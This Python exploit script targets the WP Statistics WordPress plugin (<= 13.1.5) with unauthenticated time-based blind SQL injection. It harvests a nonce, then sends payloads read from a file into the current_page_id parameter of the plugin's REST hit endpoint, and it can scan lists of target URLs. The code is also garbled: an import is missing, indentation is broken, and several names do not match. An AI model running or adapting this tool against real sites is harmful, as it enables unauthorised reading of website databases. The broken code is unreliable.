 import argparse
import requests
import urllib.parse
import os
import re
import validators
import sys

def disable_ssl_warnings():
    urllib3.disable_warnings()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def argu_check():

    if len(sys.argv) > 1:
        pass
    else:
        print('\n%s Please use -h for help.' % (sys.argv[0]))
        exit(0)

def display_message():

    print("""
    #########################################################
    #                                                       #
    #          WP Statistics Plugin <= 13.1.5               #
    #     Time-based SQL injection (Unauthenticated)        #
    #             Severity: High                            #
    #                                                       #
    #########################################################

    [$] Description:

    This vulnerability may allow unauthenticated attackers to read the
    full contents of the WordPress database using a time-based blind SQL injection payload

    """)

def check(single=None, multiple=None):

    contained_url = []

    if single:

        if not validators.url(single):
            print("You must specify a valid URL.")
            print("Exiting...")
            sys.exit()

        contained_url.append(single)

    elif multiple:

        if not os.path.exists(multiple):
            print("Specified path to URL list does not exist!")
            print("Exiting...")
            sys.exit()

        with open(multiple, 'r') as f:
            contained_url = [line.strip() for line in f]
    else:

        print("Please provide a single URL or URL list (-U or -L).")
        sys.exit()

    return contained_url

def data_generator(filename='payloads.txt'):

    with open(filename, 'r') as f:
        return [line.strip() for line in f]


def exploit(url,payload,timeout):

    for urls in url:

        wp_session = requests.session()

        try:

            resp = wp_session.get(urls,timeout=timeout)
            nonce = re.search(r'_wpnonce=(.*?)&wp_statistics_hit', resp.text).group(1)
            print(f"Gathered Nonce: {nonce}")

    except Exception as e:
        print(e)

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"}


    for payd in payload:

        payload = urllib.parse.quote_plus(pyd)
        exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0'
        exploit_url = urls + exploit

        print(f'\nSending: {exploit_url}')

        try:

            resp = wp_session.get(exploit_url, headers=headers,timeout=timeout)

        except Exception as e:

            print(e)

    if float(resp.elapsed.total_seconds()) >= 5.0:

        print("\n!!! Target is vulnerable !!!")
        print(f'\nTime taken: {resp.elapsed.total_seconds()}')

    else:
        print('Target is not vulnerable')


def main():

    disable_ssl_warnings()
    clear_terminal()
    display()

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='WP Base URL')
    parser.add_argument('-f', '--file', help='File containing  WP Base URLs',default='payload.txt',type=string)
    parser.add_argument('-t', '--timeout', help='Maximum number of seconds to wait while requesting a web page (default: 10)', default=10, type=int)

    args = parser.parse_args()

    check(single=args.url,multiple=args.file)
    blind_payload = data_generator(args.file)

    if args.file:

        print("[#] Reading URLs from file...")

        with open(args.file, "r") as f:

            urls = f.readlines()

            for url in urls:

                try:

                    if url == "\n":
                        continue
                    url = url.strip()
                    print(f"[#] Target: {url}")

                    exploit_vulnerability(url, blind_payload,args.timeout)

                except Exception as e:
                    continue

    elif args.url:

        print(f"[#] Target: {args.url}")
        exploit_vulnerability(args.url,blind_payload,argstimeout)

if __name__ == "__main__":
    main()
